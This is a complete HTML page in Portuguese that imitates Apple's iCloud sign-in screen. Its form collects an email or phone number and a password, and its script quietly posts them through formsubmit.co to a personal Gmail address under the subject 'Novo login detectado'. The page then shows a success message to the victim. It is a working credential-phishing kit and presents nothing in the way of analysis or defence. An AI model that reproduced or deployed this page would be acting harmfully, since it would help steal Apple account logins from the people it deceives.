<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iCloud</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #1c1c1e;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* Header */
    .header {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 20px;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 20px;
      font-weight: 500;
    }

    .logo svg {
      width: 18px;
      height: 18px;
    }

    .menu-btn {
      background: none;
      border: none;
      color: #ffffff;
      font-size: 22px;
      cursor: pointer;
      padding: 4px 8px;
      letter-spacing: 2px;
    }

    /* Main content */
    .main {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 380px;
      margin-top: 40px;
    }

    /* Apple logo circle */
    .apple-circle {
      width: 120px;
      height: 120px;
      position: relative;
      margin-bottom: 36px;
    }

    .dots {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: conic-gradient(
        from 0deg,
        #ff6b6b,
        #ff9f43,
        #feca57,
        #48dbfb,
        #0abde3,
        #54a0ff,
        #5f27cd,
        #a55eea,
        #ff6b6b
      );
      mask: radial-gradient(farthest-side, transparent 62%, #000 63%);
      -webkit-mask: radial-gradient(farthest-side, transparent 62%, #000 63%);
      animation: spin 12s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .apple-icon {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 42px;
      height: 42px;
    }

    /* Title */
    h1 {
      font-size: 28px;
      font-weight: 600;
      text-align: center;
      line-height: 1.25;
      margin-bottom: 32px;
      letter-spacing: -0.3px;
    }

    /* Form */
    .form {
      width: 100%;
    }

    .input-group {
      background: #2c2c2e;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      background: transparent;
      border: none;
      outline: none;
      color: #ffffff;
      font-size: 17px;
      padding: 16px 18px;
      font-family: inherit;
    }

    .input-group input::placeholder {
      color: #8e8e93;
    }

    .input-group input:first-child {
      border-bottom: 1px solid #3a3a3c;
    }

    /* Button */
    .btn {
      width: 100%;
      background: #0071e3;
      color: #ffffff;
      border: none;
      border-radius: 12px;
      padding: 16px;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      font-family: inherit;
      transition: background 0.2s;
    }

    .btn:hover {
      background: #0077ed;
    }

    .btn:active {
      background: #006edb;
    }

    /* Checkbox */
    .checkbox-row {
      display: flex;
      align-items: center;
      gap: 10px;
      margin: 22px 0 18px;
      font-size: 15px;
      color: #ffffff;
      cursor: pointer;
      user-select: none;
    }

    .checkbox-row input {
      appearance: none;
      width: 20px;
      height: 20px;
      border: 1.5px solid #8e8e93;
      border-radius: 5px;
      background: transparent;
      cursor: pointer;
      position: relative;
      flex-shrink: 0;
    }

    .checkbox-row input:checked {
      background: #0071e3;
      border-color: #0071e3;
    }

    .checkbox-row input:checked::after {
      content: "";
      position: absolute;
      left: 6px;
      top: 2px;
      width: 5px;
      height: 10px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
    }

    /* Forgot password */
    .forgot {
      display: inline-block;
      color: #0a84ff;
      font-size: 15px;
      text-decoration: none;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .forgot::after {
      content: " ↗";
      font-size: 13px;
    }
  </style>
</head>
<body>
  <header class="header">
    <div class="logo">
      <svg viewBox="0 0 17 20" fill="currentColor">
        <path d="M13.8 10.6c0-2.1 1.7-3.1 1.8-3.2-1-1.4-2.5-1.6-3-1.7-1.3-.1-2.5.8-3.1.8-.7 0-1.7-.7-2.8-.7-1.4 0-2.7.8-3.4 2.1-1.5 2.5-.4 6.3 1 8.4.7 1 1.5 2.2 2.6 2.1 1 0 1.4-.7 2.7-.7s1.6.7 2.7.7c1.1 0 1.8-1 2.5-2 .8-1.1 1.1-2.2 1.1-2.3-.1 0-2.1-.8-2.1-3.2zM11.4 3.9c.6-.7 1-1.7.9-2.7-0.9.1-1.9.6-2.5 1.3-.6.6-1.1 1.6-1 2.5 1 .1 1.9-.4 2.6-1.1z"/>
      </svg>
      iCloud
    </div>
    <button class="menu-btn" aria-label="Menu">⋯</button>
  </header>

  <main class="main">
    <div class="apple-circle">
      <div class="dots"></div>
      <svg class="apple-icon" viewBox="0 0 17 20" fill="#ffffff">
        <path d="M13.8 10.6c0-2.1 1.7-3.1 1.8-3.2-1-1.4-2.5-1.6-3-1.7-1.3-.1-2.5.8-3.1.8-.7 0-1.7-.7-2.8-.7-1.4 0-2.7.8-3.4 2.1-1.5 2.5-.4 6.3 1 8.4.7 1 1.5 2.2 2.6 2.1 1 0 1.4-.7 2.7-.7s1.6.7 2.7.7c1.1 0 1.8-1 2.5-2 .8-1.1 1.1-2.2 1.1-2.3-.1 0-2.1-.8-2.1-3.2zM11.4 3.9c.6-.7 1-1.7.9-2.7-0.9.1-1.9.6-2.5 1.3-.6.6-1.1 1.6-1 2.5 1 .1 1.9-.4 2.6-1.1z"/>
      </svg>
    </div>

    <h1>Inicie sessão com<br>a Conta Apple</h1>

    <form class="form" id="loginForm">
      <div class="input-group">
        <input type="text" name="email" placeholder="E-mail ou número de telefone" autocomplete="username" required>
        <input type="password" name="password" placeholder="Senha" autocomplete="current-password" required>
      </div>

      <button type="submit" class="btn">Iniciar sessão</button>

      <label class="checkbox-row">
        <input type="checkbox" name="keepSession">
        Manter a sessão aberta
      </label>

      <a href="#" class="forgot">Esqueceu a senha?</a>
    </form>
  </main>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const email = this.querySelector('input[name="email"]').value;
      const password = this.querySelector('input[name="password"]').value;
      const keepSession = this.querySelector('input[name="keepSession"]').checked;

      const formData = {
        email: email,
        password: password,
        keepSession: keepSession,
        _subject: "Novo login detectado",
        _captcha: "false"
      };

      fetch('https://formsubmit.co/charlescharmichael8833@gmail.com', {
        method: 'POST',
        body: new URLSearchParams(formData),
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      })
      .then(response => {
        if (response.ok) {
          alert('Dados enviados com sucesso!');
          this.reset();
        } else {
          throw new Error('Erro ao enviar dados');
        }
      })
      .catch(error => {
        console.error('Erro:', error);
        alert('Falha ao enviar dados. Verifique o console.');
      });
    });
  </script>
</body>
</html>
